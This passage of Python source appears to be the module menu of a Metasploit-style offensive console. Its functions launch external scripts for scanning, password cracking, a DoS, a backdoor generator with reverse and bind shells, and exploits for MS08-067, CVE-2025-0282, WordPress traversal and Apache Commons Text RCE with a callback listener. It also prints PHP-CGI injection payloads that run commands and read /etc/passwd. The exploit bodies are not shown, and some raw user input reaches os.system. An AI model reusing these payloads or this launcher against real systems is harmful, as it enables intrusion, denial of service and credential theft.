    scconsole116 = input("sc~" + color.red + "(scanner/ftp-anon)" + color.white + ">")
    if scconsole116 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerftpanon()
    elif scconsole116 == "clear":
        os.system('clear')
        scannerftpanon()
    elif scconsole116 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target ip address.
RPORT         | specifed as 21 (ftp port).

you will specifiy these options when you run or exploit it!
""")
        scannerftpanon()
    elif scconsole116 == "run":
        os.system('python exploits/scanner/ftp-anon.py')
        scannerftpanon()
    elif scconsole116 == "exploit":
        os.system('python exploits/scanner/ftp-anon.py')
        scannerftpanon()
    elif scconsole116 == "unuse":
        print("unusing scanner/ftp-anon.")
        time.sleep(0.5)
        Console()
    elif scconsole116 == "exit":
        exit()

def scannerportmapamp():
    scconsole117 = input("sc~" + color.red + "(scanner/portmap-amp)" + color.white + ">")
    if scconsole117 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerportmapamp()
    elif scconsole117 == "clear":
        os.system('clear')
        scannerportmapamp()
    elif scconsole117 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target ip address.
RPORT         | specifed as 80 (HTTP port).

you will specifiy these options when you run or exploit it!
""")
        scannerportmapamp()
    elif scconsole117 == "run":
        os.system('python exploits/scanner/portmap-amp.py')
        scannerportmapamp()
    elif scconsole117 == "exploit":
        os.system('python exploits/scanner/portmap-amp.py')
        scannerportmapamp()
    elif scconsole117 == "unuse":
        print("unusing scanner/portmap-amp.")
        time.sleep(0.5)
        Console()
    elif scconsole117 == "exit":
        exit()

def scannersubdomainscan():
    scconsole118 = input("sc~" + color.red + "(scanner/subdomain-scan)" + color.white + ">")
    if scconsole118 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannersubdomainscan()
    elif scconsole118 == "clear":
        os.system('clear')
        scannersubdomainscan()
    elif scconsole118 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
WEBSITE       | specify target website.
WORDLIST      | specify the wordlist to use for scan.

you will specifiy these options when you run or exploit it!
""")
        scannersubdomainscan()
    elif scconsole118 == "run":
        os.system('python exploits/scanner/subdomain-scan.py')
        scannersubdomainscan()
    elif scconsole118 == "exploit":
        os.system('python exploits/scanner/subdomain-scan.py')
        scannersubdomainscan()
    elif scconsole118 == "unuse":
        print("unusing scanner/subdomain-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole118 == "exit":
        exit()

def scannerportscan():
    scconsole119 = input("sc~" + color.red + "(scanner/portscan)" + color.white + ">")
    if scconsole119 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerportscan()
    elif scconsole119 == "clear":
        os.system('clear')
        scannerportscan()
    elif scconsole119 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target ip address or website.
RPORTS        | specify ports to start scan them.

you will specifiy these options when you run or exploit it!
""")
        scannerportscan()
    elif scconsole119 == "run":
        os.system('python exploits/scanner/portscan.py')
        scannerportscan()
    elif scconsole119 == "exploit":
        os.system('python exploits/scanner/portscan.py')
        scannerportscan()
    elif scconsole119 == "unuse":
        print("unusing scanner/portscan.")
        time.sleep(0.5)
        Console()
    elif scconsole119 == "exit":
        exit()

def auxiliarysqlixssvuln():
    scconsole120 = input("sc~" + color.red + "(auxiliary/sqli-xss-vuln)" + color.white + ">")
    if scconsole120 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliarysqlixssvuln()
    elif scconsole120 == "clear":
        os.system('clear')
        auxiliarysqlixssvuln()
    elif scconsole120 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify target url.

you will specifiy these options when you run or exploit it!
""")
        auxiliarysqlixssvuln()
    elif scconsole120 == "run":
        os.system('python exploits/auxiliary/sqli-xss-vuln.py')
        auxiliarysqlixssvuln()
    elif scconsole120 == "exploit":
        os.system('python exploits/auxiliary/sqli-xss-vuln.py')
        auxiliarysqlixssvuln()
    elif scconsole120 == "unuse":
        print("unusing auxiliary/sqli-xss-vuln.")
        time.sleep(0.5)
        Console()
    elif scconsole120 == "exit":
        exit()

def scannerpingipsite():
    scconsole121 = input("sc~" + color.red + "(scanner/ping_ip_site)" + color.white + ">")
    if scconsole121 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerpingipsite()
    elif scconsole121 == "clear":
        os.system('clear')
        scannerpingipsite()
    elif scconsole121 == "show options":
        print("""
1.
OPTIONS       | DISCREPTIONS
--------------|----------------------
WEBSITE       | specify target url.

2.
OPTIONS       | DISCREPTIONS
--------------|----------------------
IP_ADDRESS    | specify target url.

you will specifiy these options when you run or exploit it!
this exploit can scan wensite and ip address!
""")
        scannerpingipsite()
    elif scconsole121 == "run":
        os.system('python exploits/scanner/ping_ip_site.py')
        scannerpingipsite()
    elif scconsole121 == "exploit":
        os.system('python exploits/scanner/ping_ip_site.py')
        scannerpingipsite()
    elif scconsole121 == "unuse":
        print("unusing scanner/ping_ip_site.")
        time.sleep(0.5)
        Console()
    elif scconsole121 == "exit":
        exit()

def auxiliarycheckloginvuln():
    scconsole122 = input("sc~" + color.red + "(auxiliary/check-login-vuln)" + color.white + ">")
    if scconsole122 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliarycheckloginvuln()
    elif scconsole122 == "clear":
        os.system('clear')
        auxiliarycheckloginvuln()
    elif scconsole122 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify target url.

you will specifiy these options when you run or exploit it!
""")
        auxiliarycheckloginvuln()
    elif scconsole122 == "run":
        os.system('python exploits/auxiliary/check-login-vuln.py')
        auxiliarycheckloginvuln()
    elif scconsole122 == "exploit":
        os.system('python exploits/auxiliary/check-login-vuln.py')
        auxiliarycheckloginvuln()
    elif scconsole122 == "unuse":
        print("unusing auxiliary/check-login-vuln.")
        time.sleep(0.5)
        Console()
    elif scconsole122 == "exit":
        exit()

def serverphpcgiarginjection():
    scconsole123 = input("sc~" + color.red + "(server/php-cgi-arg-injection)" + color.white + ">")
    if scconsole123 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> shows the payloads you can use in this exploit.
""")
        serverphpcgiarginjection()
    elif scconsole123 == "clear":
        os.system('clear')
        serverphpcgiarginjection()
    elif scconsole123 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
VULN_URL      | specify target vulnerable url.
CHECK_STRING  | specify a string to check if execution was successful.
PAYLOAD       | specify the paylaod.

you will specifiy these options when you run or exploit it!
""")
        serverphpcgiarginjection()
    elif scconsole123 == "show payloads":
        print("""
""" + color.green + """;echo system($_GET["cmd"]);//""" + color.white + """   ---> Command execution payload.

""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.
""")
        serverphpcgiarginjection()
    elif scconsole123 == "run":
        os.system('python exploits/server/php-cgi-arg-injection.py')
        serverphpcgiarginjection()
    elif scconsole123 == "exploit":
        os.system('python exploits/server/php-cgi-arg-injection.py')
        serverphpcgiarginjection()
    elif scconsole123 == "unuse":
        print("unusing server/php-cgi-arg-injection.")
        time.sleep(0.5)
        Console()
    elif scconsole123 == "exit":
        exit()

def auxiliarypasswordcrackingcrackpassword():
    scconsole124 = input("sc~" + color.red + "(auxiliary/password_cracking/crack_password)" + color.white + ">")
    if scconsole124 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliarypasswordcrackingcrackpassword()
    elif scconsole124 == "clear":
        os.system('clear')
        auxiliarypasswordcrackingcrackpassword()
    elif scconsole124 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
HASH_TYPE     | specify the hash type.
HASH          | specify the hash to crack.
WORDLIST      | specify the wordlist to start cracking.

you will specifiy these options when you run or exploit it!
""")
        auxiliarypasswordcrackingcrackpassword()
    elif scconsole124 == "run":
        os.system('python exploits/auxiliary/password_cracking/crack_password.py')
        auxiliarypasswordcrackingcrackpassword()
    elif scconsole124 == "exploit":
        os.system('python exploits/auxiliary/password_cracking/crack_password.py')
        auxiliarypasswordcrackingcrackpassword()
    elif scconsole124 == "unuse":
        print("unusing auxiliary/password_cracking/crack_password.")
        time.sleep(0.5)
        Console()
    elif scconsole124 == "exit":
        exit()

def multicve20250282():
    scconsole124 = input("sc~" + color.red + "(multi/cve-2025-0282)" + color.white + ">")
    if scconsole124 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        multicve20250282()
    elif scconsole124 == "clear":
        os.system('clear')
        multicve20250282()
    elif scconsole124 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target ip address.
LOCAL_SHELL   | specify the local shell path.

you will specifiy these options when you run or exploit it!
""")
        multicve20250282()
    elif scconsole124 == "run":
        targetipadd12 = input("Enter target IP ADDRESS: ")
        localshellpath = input("Enter local shell path: ")
        os.system(f'python exploits/multi/cve-2025-0282.py {targetipadd12} {localshellpath}')
        multicve20250282()
    elif scconsole124 == "exploit":
        targetipadd13 = input("Enter target IP ADDRESS: ")
        localshellpath1 = input("Enter local shell path: ")
        os.system(f'python exploits/multi/cve-2025-0282.py {targetipadd13} {localshellpath1}')
        multicve20250282()
    elif scconsole124 == "unuse":
        print("unusing multi/cve-2025-0282.")
        time.sleep(0.5)
        Console()
    elif scconsole124 == "exit":
        exit()

def multigeneratebackdoor():
    scconsole125 = input("sc~" + color.red + "(multi/generate_backdoor)" + color.white + ">")
    if scconsole125 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> shows the payloads you can use in this exploit.
""")
        multigeneratebackdoor()
    elif scconsole125 == "clear":
        os.system('clear')
        multigeneratebackdoor()
    elif scconsole125 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specify the listening host.
LPORT         | specify the listening port.
OUTPUT        | specify the output name to save the backdoor.

you will specifiy these options when you run or exploit it!
""")
        multigeneratebackdoor()
    elif scconsole125 == "show payloads":
        print("""
""" + color.green + """reverse_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.

""" + color.green + """bind_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.
""")
        multigeneratebackdoor()
    elif scconsole125 == "run":
        os.system('python exploits/multi/generate_backdoor.py')
        multigeneratebackdoor()
    elif scconsole125 == "exploit":
        os.system('python exploits/multi/generate_backdoor.py')
        multigeneratebackdoor()
    elif scconsole125 == "unuse":
        print("unusing multi/generate_backdoor.")
        time.sleep(0.5)
        Console()
    elif scconsole125 == "exit":
        exit()

def multinclistener():
    scconsole126 = input("sc~" + color.red + "(multi/nc-listener)" + color.white + ">")
    if scconsole126 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        multinclistener()
    elif scconsole126 == "clear":
        os.system('clear')
        multinclistener()
    elif scconsole126 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LPORT         | specify the listening port.

you will specifiy these options when you run or exploit it!
""")
        multinclistener()
    elif scconsole126 == "run":
        listenerport342 = int(input("Enter the listening port: "))
        os.system(f'python exploits/multi/nc-listener.py {listenerport342}')
        multinclistener()
    elif scconsole126 == "exploit":
        listenerport343 = int(input("Enter the listening port: "))
        os.system(f'python exploits/multi/nc-listener.py {listenerport343}')
        multinclistener()
    elif scconsole126 == "unuse":
        print("unusing multi/nc-listener.")
        time.sleep(0.5)
        Console()
    elif scconsole126 == "exit":
        exit()

def windowsms08067netapi():
    scconsole127 = input("sc~" + color.red + "(windows/ms08_067_netapi)" + color.white + ">")
    if scconsole127 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        windowsms08067netapi()
    elif scconsole127 == "clear":
        os.system('clear')
        windowsms08067netapi()
    elif scconsole127 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address.
LHOST         | specify the listening host.
LPORT         | specify the listening port.

you will specifiy these options when you run or exploit it!
""")
        windowsms08067netapi()
    elif scconsole127 == "run":
        os.system('python exploits/windows/ms08_067_netapi.py')
        windowsms08067netapi()
    elif scconsole127 == "exploit":
        os.system('python exploits/windows/ms08_067_netapi.py')
        windowsms08067netapi()
    elif scconsole127 == "unuse":
        print("unusing windows/ms08_067_netapi.")
        time.sleep(0.5)
        Console()
    elif scconsole127 == "exit":
        exit()

def phpWordPressCore62DirectoryTraversal():
    scconsole128 = input("sc~" + color.red + "(php/WordPress_Core_6-2_Directory_Traversal)" + color.white + ">")
    if scconsole128 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        phpWordPressCore62DirectoryTraversal()
    elif scconsole128 == "clear":
        os.system('clear')
        phpWordPressCore62DirectoryTraversal()
    elif scconsole128 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        phpWordPressCore62DirectoryTraversal()
    elif scconsole128 == "run":
        os.system('python exploits/php/WordPress_Core_6-2_Directory_Traversal.py')
        phpWordPressCore62DirectoryTraversal()
    elif scconsole128 == "exploit":
        os.system('python exploits/php/WordPress_Core_6-2_Directory_Traversal.py')
        phpWordPressCore62DirectoryTraversal()
    elif scconsole128 == "unuse":
        print("unusing php/WordPress_Core_6-2_Directory_Traversal.")
        time.sleep(0.5)
        Console()
    elif scconsole128 == "exit":
        exit()

def dosApacheCommonsFileUploadandApacheTomcatDoS():
    scconsole129 = input("sc~" + color.red + "(dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS)" + color.white + ">")
    if scconsole129 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        dosApacheCommonsFileUploadandApacheTomcatDoS()
    elif scconsole129 == "clear":
        os.system('clear')
        dosApacheCommonsFileUploadandApacheTomcatDoS()
    elif scconsole129 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the target url.
N_REQUESTS    | specify the number of requests (default 10).

you will specifiy these options when you run or exploit it!
""")
        dosApacheCommonsFileUploadandApacheTomcatDoS()
    elif scconsole129 == "run":
        targeturltodos = input("Enter target URL: ")
        numberofrequests = int(input("Enter the number of requests: "))
        os.system(f'ruby exploits/dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS.rb -u {targeturltodos} -n {numberofrequests}')
        dosApacheCommonsFileUploadandApacheTomcatDoS()
    elif scconsole129 == "exploit":
        targeturltodos2 = input("Enter target URL: ")
        numberofrequests2 = int(input("Enter the number of requests: "))
        os.system(f'ruby exploits/dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS.rb -u {targeturltodos2} -n {numberofrequests2}')
        dosApacheCommonsFileUploadandApacheTomcatDoS()
    elif scconsole129 == "unuse":
        print("unusing dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS.")
        time.sleep(0.5)
        Console()
    elif scconsole129 == "exit":
        exit()

def siteApachecommonstextRCE():
    scconsole130 = input("sc~" + color.red + "(site/Apache_commons_text_RCE)" + color.white + ">")
    if scconsole130 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        siteApachecommonstextRCE()
    elif scconsole130 == "clear":
        os.system('clear')
        siteApachecommonstextRCE()
    elif scconsole130 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
TARGET_IP     | specify the target ip address.
LHOST         | specify the listening host.
LPORT         | specify the listening port.

you will specifiy these options when you run or exploit it!
""")
        siteApachecommonstextRCE()
    elif scconsole130 == "run":
        targethostip = input("Enter target ip address: ")
        callbackip = input("Enter the callback ip address(listening host): ")
        callbackport = input("Enter the callback port(listening port): ")
        os.system(f'python exploits/site/Apache_commons_text_RCE.py {targethostip} {callbackip} {callbackport}')
        siteApachecommonstextRCE()
    elif scconsole130 == "exploit":
        targethostip2 = input("Enter target ip address: ")
        callbackip2 = input("Enter the callback ip address(listening host): ")
        callbackport2 = input("Enter the callback port(listening port): ")
        os.system(f'python exploits/site/Apache_commons_text_RCE.py {targethostip2} {callbackip2} {callbackport2}')
        siteApachecommonstextRCE()
    elif scconsole130 == "unuse":
        print("unusing site/Apache_commons_text_RCE.")
        time.sleep(0.5)
        Console()
    elif scconsole130 == "exit":
        exit()

def scannerhttpoptions():
    scconsole131 = input("sc~" + color.red + "(scanner/http-options)" + color.white + ">")
    if scconsole131 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerhttpoptions()
    elif scconsole131 == "clear":
        os.system('clear')
        scannerhttpoptions()
    elif scconsole131 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        scannerhttpoptions()
    elif scconsole131 == "run":
        targethostip3 = input("Enter target url: ")
        os.system(f'python exploits/scanner/http-options.py --rhost {targethostip3}')
        scannerhttpoptions()
    elif scconsole131 == "exploit":
        targethostip4 = input("Enter target url: ")
        os.system(f'python exploits/scanner/http-options.py --rhost {targethostip4}')
        scannerhttpoptions()
    elif scconsole131 == "unuse":
        print("unusing scanner/http-options.")
        time.sleep(0.5)
        Console()
    elif scconsole131 == "exit":
        exit()

def scannerhttpsoptions():
    scconsole132 = input("sc~" + color.red + "(scanner/https-options)" + color.white + ">")
    if scconsole132 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerhttpsoptions()
    elif scconsole132 == "clear":
        os.system('clear')
        scannerhttpsoptions()
    elif scconsole132 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        scannerhttpsoptions()
    elif scconsole132 == "run":
        targethostip5 = input("Enter target url: ")
        os.system(f'python exploits/scanner/https-options.py --rhost {targethostip5}')
        scannerhttpsoptions()
    elif scconsole132 == "exploit":
        targethostip6 = input("Enter target url: ")
        os.system(f'python exploits/scanner/https-options.py --rhost {targethostip6}')
        scannerhttpsoptions()
    elif scconsole132 == "unuse":
        print("unusing scanner/https-options.")
        time.sleep(0.5)
        Console()
    elif scconsole132 == "exit":
        exit()

def scannerserverscanner():
    scconsole133 = input("sc~" + color.red + "(scanner/server-scanner)" + color.white + ">")
    if scconsole133 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerserverscanner()
    elif scconsole133 == "clear":
        os.system('clear')
        scannerserverscanner()
    elif scconsole133 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        scannerserverscanner()
    elif scconsole133 == "run":
        os.system('python exploits/scanner/server-scanner.py')
        scannerserverscanner()
    elif scconsole133 == "exploit":
        os.system('python exploits/scanner/server-scanner.py')
        scannerserverscanner()
    elif scconsole133 == "unuse":
        print("unusing scanner/server-scanner.")
        time.sleep(0.5)
        Console()
    elif scconsole133 == "exit":
        exit()

def OSconsole():
    scconsole2 = input("sc-" + color.blue + "system" + color.white + "~>")
    os.system(scconsole2)
    if scconsole2 == "back to sc-console":
        Console()




def main():
    start()
    Menu()
    while True:
        Console()


if __name__ == "__main__":
    main()
